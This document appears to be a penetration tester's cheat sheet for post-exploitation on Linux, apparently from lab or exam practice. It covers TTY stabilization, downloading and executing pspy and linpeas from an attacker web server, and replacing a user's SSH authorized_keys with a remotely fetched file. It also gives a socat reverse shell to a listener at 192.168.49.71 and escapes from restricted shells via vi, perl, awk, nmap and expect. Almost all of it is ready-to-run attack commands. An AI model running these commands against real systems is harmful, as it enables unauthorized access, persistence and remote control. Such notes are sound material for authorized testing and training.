# Breakout

### Initial Access and Shell Stabilization  

Don't forget that you can always set the terminal history to be infinite, and the keystroke scroll back. 

Grab a valid tty.

What OS are you on? Grab access to those binaries fast by exporting each environment variable. Debian/CentOS/FreeBSD

Want a color terminal to easily tell apart file permissions? Directories? Files?

Fastest way to list out the files in a directory, show size, show permissions, human readable.

Make this shell stable.

```bash 
# Python method to spawn a bash shell   
python -c 'import pty; pty.spawn("/bin/bash")'  
python3 -c 'import pty; pty.spawn("/bin/bash")' 

# Set environment variables 
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp:/snap/bin  
export TERM=xterm-256color  

# Alias for enhanced listing
alias ll='ls -lsaht --color=auto'   

# Background the current process with Ctrl + Z  
# Then prepare the terminal 
stty raw -echo; fg; reset
(stty size)
stty columns 200 rows 200
stty columns 150 rows 150
```

### File Transfer and Execution 

```bash 
# Download and execute tools
wget http://192.168.45.178:8000/pspy64 -O /dev/shm/pspy; chmod +x /dev/shm/pspy 
wget http://192.168.45.178:8000/linpeas.sh -O /dev/shm/linpeas.sh; chmod +x /dev/shm/linpeas.sh 
/dev/shm/pspy   

# Multiple sources and tools
wget http://10.10.14.8:8000/pspy64 -O /dev/shm/pspy; chmod +x /dev/shm/pspy 
wget http://10.10.14.8:8000/linpeas.sh -O /dev/shm/linpeas.sh; chmod +x /dev/shm/linpeas.sh 
/dev/shm/linpeas.sh 
``` 

### SSH Key Manipulation

```bash 
# Replace authorized_keys for user  
wget http://192.168.45.178:8000/authorized_keys -O /home/kathleen/.ssh/authorized_keys  
``` 

### Reverse Shell Setup 

```bash 
# Check if socat is available   
which socat 

# Setup reverse shell listener on Kali  
socat file:`tty`,raw,echo=0 tcp-listen:4444 

# Connect back from the victim machine  
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.49.71:4444  
``` 

### Restricted Shell Bypass 

```bash 
# Vim method to escape restricted bash (rbash)  
vi :set shell=/bin/sh   
:shell  

# SSH method to bypass restricted shell 
ssh user@127.0.0.1 "/bin/sh"
rm $HOME/.bashrc
exit
``` 

### Alternative Shells  

```bash 
# Check and use Python if available 
python -c 'import pty; pty.spawn("/bin/bash")'  
python -c 'import pty; pty.spawn("/bin/sh")'

# Is perl present?
perl -e 'exec "/bin/bash";' 
perl -e 'exec "/bin/sh";'   

# Is AWK present?
awk 'BEGIN {system("/bin/bash -i")}'
awk 'BEGIN {system("/bin/sh -i")}'  

# Is ed present?
ed !sh  

# Is IRB present?
exec "/bin/sh"  

# Nmap ?
nmap --interactive  
nmap> !sh   

# expect ?
expect -v   
cat > /tmp/shell.sh <<EOF   
#!/usr/bin/expect   
spawn bash  
interact
EOF 
chmod u+x /tmp/shell.sh 
/tmp/shell.sh   
```